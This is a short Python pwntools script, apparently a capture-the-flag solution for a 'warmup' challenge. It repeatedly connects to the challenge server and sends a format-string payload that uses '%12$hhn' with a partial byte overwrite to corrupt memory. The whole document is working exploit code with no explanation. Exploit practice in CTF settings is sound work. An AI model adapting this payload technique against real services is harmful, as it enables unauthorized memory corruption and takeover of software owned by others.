from pwn import *

while True:
    p = remote("warmup.ctf.defenit.kr", 3333)
    e = ELF('./warmup')
    libc = e.libc

    payload = ''
    payload += '%{}c'.format(224)
    payload += 'A' * (64 - len(payload) - 7)
    payload += '%12$hhn'
    payload += '\x48'

    p.send(payload)

    try:
        print p.recv(30)
        break
    except:
        p.close()
        continue
